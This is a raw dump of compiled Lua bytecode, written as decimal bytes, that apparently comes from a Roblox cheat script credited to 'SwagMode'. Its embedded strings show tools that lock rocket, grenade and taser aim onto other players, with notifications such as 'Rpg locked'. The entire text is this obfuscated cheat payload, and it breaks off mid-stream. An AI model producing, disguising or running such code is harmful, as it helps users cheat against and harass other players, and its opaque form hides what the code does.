0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\170\8\0\0\102\9\0\0\3\0\0\5\13\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\0\193\0\139\64\65\1\36\1\0\0\4\0\128\0\4\0\0\1\156\64\128\1\30\0\128\0\6\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\177\8\0\0\100\9\0\0\2\0\0\10\80\0\0\0\36\0\0\0\7\0\0\0\5\64\0\0\6\128\64\0\11\192\64\0\129\0\1\0\202\192\0\0\201\128\193\130\201\0\194\131\201\128\194\132\28\64\0\2\1\0\3\0\7\192\2\0\1\128\3\0\7\64\3\0\5\192\2\0\7\192\3\0\5\64\3\0\7\0\4\0\1\128\4\0\7\64\4\0\5\64\0\0\11\192\68\0\129\0\5\0\28\128\128\1\8\0\0\0\5\64\0\0\6\0\69\0\6\64\69\0\8\0\128\0\4\0\128\0\11\192\69\0\28\128\0\1\7\128\5\0\36\64\0\0\7\0\0\0\3\0\0\0\7\0\6\0\3\0\0\0\7\64\6\0\36\128\0\0\4\0\128\0\100\192\0\0\4\0\128\0\164\0\1\0\4\0\128\0\192\0\0\1\220\64\128\0\192\0\0\0\220\64\128\0\192\0\128\0\220\64\128\0\195\0\128\1\36\65\1\0\4\0\128\0\4\0\0\0\100\129\1\0\0\0\128\1\0\0\0\2\164\193\1\0\0\0\128\1\192\1\128\2\220\65\128\0\197\129\6\0\220\65\128\0\196\1\128\0\198\193\198\3\218\1\0\0\22\192\1\128\196\1\128\0\198\193\198\3\203\1\199\3\65\66\7\0\220\129\128\1\198\129\199\3\23\192\199\3\22\64\252\127\192\1\0\3\220\65\128\0\30\0\128\0\32\0\0\0\4\9\0\0\0\97\110\110\111\117\110\99\101\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\83\116\97\114\116\101\114\71\117\105\0\4\8\0\0\0\83\101\116\67\111\114\101\0\4\17\0\0\0\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110\0\4\6\0\0\0\84\105\116\108\101\0\4\11\0\0\0\76\111\99\107\32\84\111\111\108\115\0\4\5\0\0\0\84\101\120\116\0\4\22\0\0\0\84\104\97\110\107\32\89\111\117\32\83\119\97\103\77\111\100\101\32\58\51\0\4\9\0\0\0\68\117\114\97\116\105\111\110\0\3\0\0\0\0\0\0\46\64\4\3\0\0\0\68\83\0\3\0\0\0\0\0\192\82\64\4\3\0\0\0\68\84\0\3\0\0\0\0\0\0\20\64\4\9\0\0\0\82\112\103\84\105\109\101\114\0\4\9\0\0\0\68\105\115\116\97\110\99\101\0\4\10\0\0\0\82\80\71\84\97\114\103\101\116\0\4\5\0\0\0\78\111\110\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\6\0\0\0\109\111\117\115\101\0\4\9\0\0\0\71\101\116\77\111\117\115\101\0\4\12\0\0\0\84\97\122\101\114\84\97\114\103\101\116\0\4\14\0\0\0\71\114\101\110\97\100\101\84\97\114\103\101\116\0\4\5\0\0\0\119\97\105\116\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\22\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\79\102\67\108\97\115\115\0\4\9\0\0\0\72\117\109\97\110\111\105\100\0\4\5\0\0\0\68\105\101\100\0\1\1\8\0\0\0\0\0\0\0\181\8\0\0\187\8\0\0\0\3\0\7\10\0\0\0\197\0\0\0\198\64\192\1\203\128\192\1\65\193\0\0\138\193\0\0\137\1\0\130\137\65\128\130\137\129\0\131\220\64\0\2\30\0\128\0\7\0\0\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\83\116\97\114\116\101\114\71\117\105\0\4\8\0\0\0\83\101\116\67\111\114\101\0\4\17\0\0\0\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110\0\4\6\0\0\0\84\105\116\108\101\0\4\5\0\0\0\84\101\120\116\0\4\9\0\0\0\68\117\114\97\116\105\111\110\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\207\8\0\0\213\8\0\0\0\3\0\7\10\0\0\0\197\0\0\0\198\64\192\1\203\128\192\1\65\193\0\0\138\193\0\0\137\1\0\130\137\65\128\130\137\129\0\131\220\64\0\2\30\0\128\0\7\0\0\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\83\116\97\114\116\101\114\71\117\105\0\4\8\0\0\0\83\101\116\67\111\114\101\0\4\17\0\0\0\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110\0\4\6\0\0\0\84\105\116\108\101\0\4\5\0\0\0\84\101\120\116\0\4\9\0\0\0\68\117\114\97\116\105\111\110\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\221\8\0\0\245\8\0\0\1\0\0\4\15\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\134\192\64\1\28\128\128\1\9\64\65\130\9\192\65\131\9\192\65\132\9\128\194\132\70\192\66\0\75\0\195\0\228\0\0\0\92\64\128\1\30\0\128\0\13\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\5\0\0\0\84\111\111\108\0\4\9\0\0\0\66\97\99\107\112\97\99\107\0\4\8\0\0\0\84\111\111\108\84\105\112\0\4\32\0\0\0\67\108\105\99\107\32\97\32\112\108\97\121\101\114\32\116\111\32\114\112\103\32\108\111\99\107\32\116\104\101\109\0\4\13\0\0\0\67\97\110\66\101\68\114\111\112\112\101\100\0\1\0\4\15\0\0\0\82\101\113\117\105\114\101\115\72\97\110\100\108\101\0\4\5\0\0\0\78\97\109\101\0\4\9\0\0\0\82\112\103\32\76\111\99\107\0\4\10\0\0\0\65\99\116\105\118\97\116\101\100\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\228\8\0\0\244\8\0\0\0\0\0\5\45\0\0\0\5\0\0\0\6\64\64\0\6\128\64\0\11\192\64\0\129\0\1\0\28\128\128\1\26\64\0\0\22\192\1\128\69\0\0\0\70\64\192\0\70\128\192\0\70\128\192\0\75\192\192\0\193\0\1\0\92\128\128\1\0\0\128\0\26\0\0\0\22\128\4\128\70\128\64\0\70\64\193\0\23\128\193\0\22\64\1\128\70\128\64\0\70\128\192\0\70\128\192\0\70\64\193\0\71\192\1\0\22\128\0\128\70\128\64\0\70\64\193\0\71\192\1\0\69\0\2\0\129\64\2\0\197\192\1\0\1\129\2\0\92\64\0\2\22\128\1\128\67\0\128\0\71\192\1\0\69\0\2\0\129\192\2\0\193\0\3\0\1\129\2\0\92\64\0\2\30\0\128\0\13\0\0\0\4\6\0\0\0\109\111\117\115\101\0\4\7\0\0\0\84\97\114\103\101\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\11\0\0\0\76\111\119\101\114\84\111\114\115\111\0\4\5\0\0\0\78\97\109\101\0\4\13\0\0\0\83\112\101\99\105\97\108\80\97\114\116\115\0\4\10\0\0\0\82\80\71\84\97\114\103\101\116\0\4\9\0\0\0\97\110\110\111\117\110\99\101\0\4\11\0\0\0\82\112\103\32\108\111\99\107\101\100\0\3\0\0\0\0\0\0\8\64\4\13\0\0\0\82\112\103\32\117\110\108\111\99\107\101\100\0\4\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\246\8\0\0\14\9\0\0\1\0\0\4\15\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\134\192\64\1\28\128\128\1\9\64\65\130\9\192\65\131\9\192\65\132\9\128\194\132\70\192\66\0\75\0\195\0\228\0\0\0\92\64\128\1\30\0\128\0\13\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\5\0\0\0\84\111\111\108\0\4\9\0\0\0\66\97\99\107\112\97\99\107\0\4\8\0\0\0\84\111\111\108\84\105\112\0\4\36\0\0\0\67\108\105\99\107\32\97\32\112\108\97\121\101\114\32\116\111\32\103\114\101\110\97\100\101\32\108\111\99\107\32\116\104\101\109\0\4\13\0\0\0\67\97\110\66\101\68\114\111\112\112\101\100\0\1\0\4\15\0\0\0\82\101\113\117\105\114\101\115\72\97\110\100\108\101\0\4\5\0\0\0\78\97\109\101\0\4\13\0\0\0\71\114\101\110\97\100\101\32\76\111\99\107\0\4\10\0\0\0\65\99\116\105\118\97\116\101\100\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\253\8\0\0\13\9\0\0\0\0\0\5\45\0\0\0\5\0\0\0\6\64\64\0\6\128\64\0\11\192\64\0\129\0\1\0\28\128\128\1\26\64\0\0\22\192\1\128\69\0\0\0\70\64\192\0\70\128\192\0\70\128\192\0\75\192\192\0\193\0\1\0\92\128\128\1\0\0\128\0\26\0\0\0\22\128\4\128\70\128\64\0\70\64\193\0\23\128\193\0\22\64\1\128\70\128\64\0\70\128\192\0\70\128\192\0\70\64\193\0\71\192\1\0\22\128\0\128\70\128\64\0\70\64\193\0\71\192\1\0\69\0\2\0\129\64\2\0\197\192\1\0\1\129\2\0\92\64\0\2\22\128\1\128\67\0\128\0\71\192\2\0\69\0\2\0\129\0\3\0\193\64\3\0\1\129\3\0\92\64\0\2\30\0\128\0\15\0\0\0\4\6\0\0\0\109\111\117\115\101\0\4\7\0\0\0\84\97\114\103\101\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\11\0\0\0\76\111\119\101\114\84\111\114\115\111\0\4\5\0\0\0\78\97\109\101\0\4\13\0\0\0\83\112\101\99\105\97\108\80\97\114\116\115\0\4\14\0\0\0\71\114\101\110\97\100\101\84\97\114\103\101\116\0\4\9\0\0\0\97\110\110\111\117\110\99\101\0\4\16\0\0\0\71\114\101\110\97\100\101\115\32\108\111\99\107\101\100\0\3\0\0\0\0\0\0\20\64\4\12\0\0\0\84\97\122\101\114\84\97\114\103\101\116\0\4\18\0\0\0\71\114\101\110\97\100\101\115\32\117\110\108\111\99\107\101\100\0\4\1\0\0\0\0\3\0\0\0\0\0\0\8\64\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\15\9\0\0\39\9\0\0\1\0\0\4\15\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\134\192\64\1\28\128\128\1\9\64\65\130\9\192\65\131\9\192\65\132\9\128\194\132\70\192\66\0\75\0\195\0\228\0\0\0\92\64\128\1\30\0\128\0\13\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\5\0\0\0\84\111\111\108\0\4\9\0\0\0\66\97\99\107\112\97\99\107\0\4\8\0\0\0\84\111\111\108\84\105\112\0\4\34\0\0\0\67\108\105\99\107\32\97\32\112\108\97\121\101\114\32\116\111\32\116\97\122\101\114\32\108\111\99\107\32\116\104\101\109\0\4\13\0\0\0\67\97\110\66\101\68\114\111\112\112\101\100\0\1\0\4\15\0\0\0\82\101\113\117\105\114\101\115\72\97\110\100\108\101\0\4\5\0\0\0\78\97\109\101\0\4\11\0\0\0\84\97\122\101\114\32\76\111\99\107\0\4\10\0\0\0\65\99\116\105\118\97\116\101\100\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\22\9\0\0\38\9\0\0\0\0\0\5\45\0\0\0\5\0\0\0\6\64\64\0\6\128\64\0\11\192\64\0\129\0\1\0\28\128\128\1\26\64\0\0\22\192\1\128\69\0\0\0\70\64\192\0\70\128\192\0\70\128\192\0\75\192\192\0\193\0\1\0\92\128\128\1\0\0\128\0\26\0\0\0\22\128\4\128\70\128\64\0\70\64\193\0\23\128\193\0\22\64\1\128\70\128\64\0\70\128\192\0\70\128\192\0\70\64\193\0\71\192\1\0\22\128\0\128\70\128\64\0\70\64\193\0\71\192\1\0\69\0\2\0\129\64\2\0\197\192\1\0\1\129\2\0\92\64\0\2\22\128\1\128\67\0\128\0\71\192\1\0\69\0\2\0\129\192\2\0\193\0\3\0\1\65\3\0\92\64\0\2\30\0\128\0\14\0\0\0\4\6\0\0\0\109\111\117\115\101\0\4\7\0\0\0\84\97\114\103\101\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\11\0\0\0\76\111\119\101\114\84\111\114\115\111\0\4\5\0\0\0\78\97\109\101\0\4\13\0\0\0\83\112\101\99\105\97\108\80\97\114\116\115\0\4\12\0\0\0\84\97\122\101\114\84\97\114\103\101\116\0\4\9\0\0\0\97\110\110\111\117\110\99\101\0\4\18\0\0\0\84\97\115\101\114\32\108\111\99\107\101\100\32\111\110\116\111\0\3\0\0\0\0\0\0\20\64\4\15\0\0\0\84\97\115\101\114\32\117\110\108\111\99\107\101\100\0\4\1\0\0\0\0\3\0\0\0\0\0\0\8\64\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\46\9\0\0\90\9\0\0\2\0\0\7\157\0\0\0\5\0\0\0\87\64\64\0\22\64\20\128\5\128\0\0\11\192\64\0\129\0\1\0\28\128\128\1\11\64\65\0\129\128\1\0\28\128\128\1\11\64\65\0\129\192\1\0\28\128\128\1\26\64\0\0\22\64\2\128\5\128\0\0\11\192\64\0\129\0\1\0\28\128\128\1\11\64\65\0\129\128\1\0\28\128\128\1\11\64\65\0\129\0\2\0\28\128\128\1\69\128\0\0\75\192\192\0\193\0\1\0\92\128\128\1\70\64\194\0\75\64\193\0\197\0\0\0\92\128\128\1\26\0\0\0\22\64\11\128\90\0\0\0\22\192\10\128\139\64\193\0\1\129\2\0\156\128\128\1\154\0\0\0\22\64\8\128\197\192\2\0\25\192\0\134\22\128\3\128\197\64\3\0\198\128\195\1\6\193\67\1\6\1\68\2\70\193\67\1\70\65\196\2\76\129\196\2\134\193\67\1\134\193\68\3\220\128\0\2\9\192\128\134\197\192\2\0\205\0\197\1\199\192\2\0\22\0\6\128\197\64\3\0\198\128\195\1\6\193\67\1\6\1\68\2\70\193\67\1\70\65\196\2\133\65\5\0\76\129\129\2\134\193\67\1\134\193\68\3\220\128\0\2\9\192\128\134\197\64\5\0\205\0\197\1\199\64\5\0\22\0\2\128\197\128\5\0\199\192\2\0\197\192\5\0\199\64\5\0\22\192\0\128\133\128\5\0\135\192\2\0\133\192\5\0\135\64\5\0\5\0\6\0\87\64\64\0\22\0\10\128\4\0\0\0\6\64\70\0\11\64\65\0\129\128\6\0\28\128\128\1\26\0\0\0\22\64\8\128\4\0\0\0\6\64\70\0\6\128\70\0\11\64\65\0\129\192\6\0\28\128\128\1\11\64\65\0\129\0\7\0\28\128\128\1\26\0\0\0\22\128\5\128\69\128\0\0\70\0\193\0\70\64\194\0\75\64\193\0\197\0\6\0\92\128\128\1\75\64\193\0\193\64\7\0\92\128\128\1\90\64\0\0\22\192\1\128\69\128\0\0\70\0\193\0\75\64\193\0\197\0\6\0\92\128\128\1\75\64\193\0\193\64\7\0\92\128\128\1\90\0\0\0\22\64\0\128\134\192\195\0\9\128\128\135\5\128\7\0\87\64\64\0\22\192\5\128\5\192\7\0\65\0\8\0\28\64\0\1\5\128\0\0\6\0\65\0\6\128\65\0\11\64\65\0\129\192\6\0\28\128\128\1\68\0\128\0\75\64\193\0\197\128\7\0\92\128\128\1\26\0\0\0\22\0\2\128\90\0\0\0\22\128\1\128\134\64\198\0\154\0\0\0\22\192\0\128\134\64\198\0\134\64\71\1\134\192\67\1\9\128\128\135\30\0\128\0\33\0\0\0\4\10\0\0\0\82\80\71\84\97\114\103\101\116\0\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\10\0\0\0\87\111\114\107\115\112\97\99\101\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\8\0\0\0\73\103\110\111\114\101\100\0\4\9\0\0\0\76\97\117\110\99\104\101\114\0\4\11\0\0\0\77\121\76\97\117\110\99\104\101\114\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\17\0\0\0\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\0\4\9\0\0\0\82\112\103\84\105\109\101\114\0\3\0\0\0\0\0\0\0\0\4\7\0\0\0\67\70\114\97\109\101\0\4\4\0\0\0\110\101\119\0\4\9\0\0\0\80\111\115\105\116\105\111\110\0\4\2\0\0\0\88\0\4\2\0\0\0\89\0\3\0\0\0\0\0\0\20\64\4\2\0\0\0\90\0\3\0\0\0\0\0\0\240\63\4\9\0\0\0\68\105\115\116\97\110\99\101\0\4\3\0\0\0\68\83\0\4\3\0\0\0\68\84\0\4\12\0\0\0\84\97\122\101\114\84\97\114\103\101\116\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\8\0\0\0\91\84\97\115\101\114\93\0\4\7\0\0\0\72\97\110\100\108\101\0\4\5\0\0\0\80\97\114\116\0\4\11\0\0\0\85\112\112\101\114\84\111\114\115\111\0\4\14\0\0\0\71\114\101\110\97\100\101\84\97\114\103\101\116\0\4\6\0\0\0\112\114\105\110\116\0\4\7\0\0\0\108\111\111\107\105\110\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\91\9\0\0\93\9\0\0\2\0\0\3\10\0\0\0\5\0\0\0\11\64\64\0\129\128\0\0\28\128\128\1\6\192\64\0\11\0\65\0\132\0\128\0\28\128\128\1\8\0\0\0\30\0\128\0\5\0\0\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\11\0\0\0\82\117\110\83\101\114\118\105\99\101\0\4\10\0\0\0\72\101\97\114\116\98\101\97\116\0\4\8\0\0\0\67\111\110\110\101\99\116\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\94\9\0\0\96\9\0\0\1\0\0\2\4\0\0\0\4\0\0\0\11\0\64\0\28\64\0\1\30\0\128\0\1\0\0\0\4\11\0\0\0\68\105\115\99\111\110\110\101\99\116\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\104\9\0\0\158\13\0\0\1\0\0\5\12\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\0\193\0\139\64\65\1\36\1\0\0\0\0\0\0\156\64\128\1\30\0\128\0\6\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\111\9\0\0\157\13\0\0\1\0\0\14\205\2\0\0\36\0\0\0\7\0\0\0\10\0\0\0\7\64\0\0\5\192\0\0\6\0\65\0\65\64\1\0\133\128\1\0\139\192\65\1\1\1\2\0\156\0\128\1\28\128\0\0\7\128\0\0\5\192\0\0\6\0\65\0\65\128\2\0\28\128\0\1\7\64\2\0\5\192\0\0\6\0\65\0\65\0\3\0\28\128\0\1\7\192\2\0\5\192\0\0\6\0\65\0\65\128\3\0\28\128\0\1\7\64\3\0\5\192\0\0\6\0\65\0\65\0\3\0\28\128\0\1\7\192\3\0\5\192\0\0\6\0\65\0\65\64\4\0\28\128\0\1\7\0\4\0\5\192\0\0\6\0\65\0\65\192\4\0\28\128\0\1\7\128\4\0\5\192\0\0\6\0\65\0\65\64\4\0\28\128\0\1\7\0\5\0\5\192\0\0\6\0\65\0\65\192\4\0\28\128\0\1\7\64\5\0\5\192\0\0\6\0\65\0\65\64\4\0\28\128\0\1\7\128\5\0\5\192\0\0\6\0\65\0\65\0\3\0\28\128\0\1\7\192\5\0\5\192\0\0\6\0\65\0\65\192\4\0\28\128\0\1\7\0\6\0\5\192\0\0\6\0\65\0\65\0\3\0\28\128\0\1\7\64\6\0\5\192\0\0\6\0\65\0\65\192\4\0\28\128\0\1\7\128\6\0\5\192\0\0\6\0\65\0\65\0\3\0\28\128\0\1\7\192\6\0\5\192\0\0\6\0\65\0\65\192\4\0\28\128\0\1\7\0\7\0\5\64\2\0\9\128\199\142\5\64\2\0\69\128\0\0\9\64\128\143\5\64\2\0\9\64\72\144\5\192\2\0\9\128\200\142\5\192\2\0\69\64\2\0\9\64\128\143\5\192\2\0\69\0\9\0\70\192\200\0\70\64\201\0\9\64\128\145\5\192\2\0\69\128\9\0\70\0\193\0\129\192\9\0\92\128\0\1\9\64\0\147\5\192\2\0\9\64\74\148\5\192\2\0\69\192\10\0\70\0\193\0\129\0\11\0\193\64\11\0\1\1\11\0\92\128\0\2\9\64\0\149\5\192\2\0\9\64\72\151\5\192\2\0\69\0\9\0\70\192\203\0\70\0\204\0\9\64\128\151\5\192\2\0\69\192\10\0\70\0\193\0\129\64\10\0\193\128\12\0\1\193\12\0\92\128\0\2\9\64\128\152\5\192\2\0\69\0\13\0\70\0\193\0\129\64\13\0\193\128\13\0\1\193\13\0\65\1\14\0\129\65\14\0\193\129\14\0\1\194\14\0\65\66\10\0\129\2\15\0\193\66\15\0\1\131\15\0\65\3\14\0\92\128\128\6\9\64\0\154\5\192\2\0\69\0\9\0\70\0\208\0\70\64\208\0\9\64\128\159\5\192\2\0\69\0\9\0\70\0\208\0\70\64\208\0\9\64\0\161\5\192\2\0\69\0\17\0\70\0\193\0\129\64\17\0\193\128\17\0\1\193\17\0\92\128\0\2\9\64\128\161\5\192\2\0\69\192\10\0\70\0\193\0\129\64\13\0\193\128\13\0\1\193\13\0\92\128\0\2\9\64\0\164\5\192\2\0\69\192\10\0\70\0\193\0\129\0\11\0\193\64\11\0\1\1\11\0\92\128\0\2\9\64\128\164\5\192\2\0\69\0\17\0\70\0\193\0\129\64\17\0\193\128\17\0\1\193\17\0\92\128\0\2\9\64\128\161\5\64\3\0\69\192\2\0\9\64\128\143\5\64\3\0\69\192\10\0\70\0\193\0\129\192\18\0\193\192\18\0\1\193\18\0\92\128\0\2\9\64\0\165\5\64\3\0\69\192\10\0\70\0\193\0\129\192\18\0\193\192\18\0\1\193\18\0\92\128\0\2\9\64\0\165\5\192\3\0\9\0\211\142\5\192\3\0\69\64\2\0\9\64\128\143\5\192\3\0\69\0\9\0\70\192\200\0\70\64\201\0\9\64\128\145\5\192\3\0\69\128\9\0\70\0\193\0\129\192\9\0\92\128\0\1\9\64\0\147\5\192\3\0\9\128\211\166\5\192\3\0\9\64\74\148\5\192\3\0\69\192\10\0\70\0\193\0\129\192\19\0\193\0\20\0\1\65\20\0\92\128\0\2\9\64\0\149\5\192\3\0\9\64\72\151\5\192\3\0\69\0\9\0\70\192\203\0\70\0\204\0\9\64\128\151\5\192\3\0\69\192\10\0\70\0\193\0\129\128\20\0\193\192\20\0\1\1\21\0\92\128\0\2\9\64\128\152\5\192\3\0\69\0\13\0\70\0\193\0\129\64\21\0\193\128\21\0\1\193\21\0\65\1\22\0\129\65\22\0\193\129\22\0\1\194\22\0\65\2\23\0\129\66\23\0\193\130\23\0\1\195\23\0\65\3\24\0\92\128\128\6\9\64\0\154\5\192\3\0\69\0\9\0\70\0\208\0\70\64\208\0\9\64\128\159\5\192\3\0\69\0\9\0\70\0\208\0\70\64\208\0\9\64\0\161\5\192\3\0\69\0\17\0\70\0\193\0\129\64\17\0\193\128\17\0\1\193\17\0\92\128\0\2\9\64\128\161\5\192\3\0\69\192\10\0\70\0\193\0\129\64\21\0\193\128\21\0\1\193\21\0\92\128\0\2\9\64\0\164\5\192\3\0\69\192\10\0\70\0\193\0\129\64\24\0\193\128\24\0\1\193\24\0\92\128\0\2\9\64\128\164\5\192\3\0\69\0\17\0\70\0\193\0\129\64\17\0\193\128\17\0\1\193\17\0\92\128\0\2\9\64\128\161\5\0\4\0\69\64\2\0\9\64\128\143\5\0\25\0\6\64\89\0\69\64\0\0\133\0\0\0\197\0\4\0\36\65\0\0\4\0\0\0\156\0\128\1\28\64\0\0\5\128\4\0\9\128\217\142\5\128\4\0\69\64\2\0\9\64\128\143\5\0\25\0\6\64\89\0\69\64\0\0\133\0\0\0\197\128\4\0\36\129\0\0\4\0\0\0\156\0\128\1\28\64\0\0\5\0\5\0\9\192\217\142\5\0\5\0\69\64\2\0\9\64\128\143\5\0\25\0\6\64\89\0\69\64\0\0\133\0\0\0\197\0\5\0\36\193\0\0\4\0\0\0\156\0\128\1\28\64\0\0\5\64\5\0\9\0\218\142\5\64\5\0\69\64\2\0\9\64\128\143\5\64\5\0\9\128\218\180\5\0\25\0\6\64\89\0\69\64\0\0\133\0\0\0\197\64\5\0\36\1\1\0\4\0\0\0\156\0\128\1\28\64\0\0\5\128\5\0\9\192\218\142\5\128\5\0\69\64\2\0\9\64\128\143\5\0\25\0\6\64\89\0\69\64\0\0\133\0\0\0\197\128\5\0\36\65\1\0\4\0\0\0\156\0\128\1\28\64\0\0\5\192\5\0\9\0\219\142\5\192\5\0\69\64\2\0\9\64\128\143\5\192\5\0\69\0\9\0\70\192\200\0\70\64\201\0\9\64\128\145\5\192\5\0\69\128\9\0\70\0\193\0\129\192\9\0\92\128\0\1\9\64\0\147\5\192\5\0\9\64\91\148\5\192\5\0\69\192\10\0\70\0\193\0\129\0\11\0\193\128\27\0\1\1\11\0\92\128\0\2\9\64\0\149\5\192\5\0\69\0\9\0\70\0\220\0\70\64\220\0\9\64\128\183\5\192\5\0\69\192\10\0\70\0\193\0\129\128\28\0\193\192\28\0\1\1\29\0\92\128\0\2\9\64\128\152\5\192\5\0\69\0\13\0\70\0\193\0\129\64\29\0\193\128\29\0\1\193\29\0\65\1\30\0\129\65\30\0\193\129\30\0\1\194\30\0\65\66\10\0\129\2\31\0\193\66\31\0\1\131\31\0\65\195\31\0\92\128\128\6\9\64\0\154\5\192\5\0\69\0\17\0\70\0\193\0\129\64\17\0\193\128\17\0\1\193\17\0\92\128\0\2\9\64\128\161\5\192\5\0\69\192\10\0\70\0\193\0\129\64\29\0\193\128\29\0\1\193\29\0\92\128\0\2\9\64\0\164\5\192\5\0\69\192\10\0\70\0\193\0\129\0\11\0\193\0\32\0\1\1\11\0\92\128\0\2\9\64\128\164\5\192\5\0\69\0\17\0\70\0\193\0\129\64\17\0\193\128\17\0\1\193\17\0\92\128\0\2\9\64\128\161\5\0\6\0\9\64\224\142\5\0\6\0\69\192\5\0\9\64\128\143\5\0\25\0\6\64\89\0\69\64\0\0\133\0\0\0\197\0\6\0\36\129\1\0\4\0\0\0\156\0\128\1\28\64\0\0\5\64\6\0\9\0\219\142\5\64\6\0\69\64\2\0\9\64\128\143\5\64\6\0\69\0\9\0\70\192\200\0\70\64\201\0\9\64\128\145\5\64\6\0\69\128\9\0\70\0\193\0\129\192\9\0\92\128\0\1\9\64\0\147\5\64\6\0\9\64\91\148\5\64\6\0\69\192\10\0\70\0\193\0\129\128\32\0\193\192\32\0\1\1\33\0\92\128\0\2\9\64\0\149\5\64\6\0\69\192\10\0\70\0\193\0\129\64\33\0\193\0\20\0\1\129\20\0\92\128\0\2\9\64\128\152\5\64\6\0\69\0\13\0\70\0\193\0\129\128\33\0\193\192\33\0\1\1\34\0\65\1\30\0\129\65\34\0\193\129\34\0\1\194\30\0\65\194\34\0\129\2\35\0\193\66\31\0\1\67\35\0\65\131\35\0\92\128\128\6\9\64\0\154\5\64\6\0\69\0\17\0\70\0\193\0\129\64\17\0\193\128\17\0\1\193\17\0\92\128\0\2\9\64\128\161\5\64\6\0\69\192\10\0\70\0\193\0\129\128\33\0\193\192\33\0\1\1\34\0\92\128\0\2\9\64\0\164\5\64\6\0\69\192\10\0\70\0\193\0\129\192\35\0\193\0\32\0\1\1\11\0\92\128\0\2\9\64\128\164\5\64\6\0\69\0\17\0\70\0\193\0\129\64\17\0\193\128\17\0\1\193\17\0\92\128\0\2\9\64\128\161\5\128\6\0\9\64\224\142\5\128\6\0\69\64\6\0\9\64\128\143\5\0\25\0\6\64\89\0\69\64\0\0\133\0\0\0\197\128\6\0\36\193\1\0\4\0\0\0\156\0\128\1\28\64\0\0\5\192\6\0\9\0\219\142\5\192\6\0\69\64\2\0\9\64\128\143\5\192\6\0\69\0\9\0\70\192\200\0\70\64\201\0\9\64\128\145\5\192\6\0\69\128\9\0\70\0\193\0\129\192\9\0\92\128\0\1\9\64\0\147\5\192\6\0\9\64\91\148\5\192\6\0\69\192\10\0\70\0\193\0\129\0\36\0\193\64\36\0\1\129\36\0\92\128\0\2\9\64\0\149\5\192\6\0\69\192\10\0\70\0\193\0\129\64\33\0\193\0\20\0\1\129\20\0\92\128\0\2\9\64\128\152\5\192\6\0\69\0\13\0\70\0\193\0\129\192\36\0\193\0\37\0\1\1\34\0\65\65\37\0\129\129\37\0\193\193\37\0\1\2\38\0\65\66\38\0\129\130\38\0\193\194\38\0\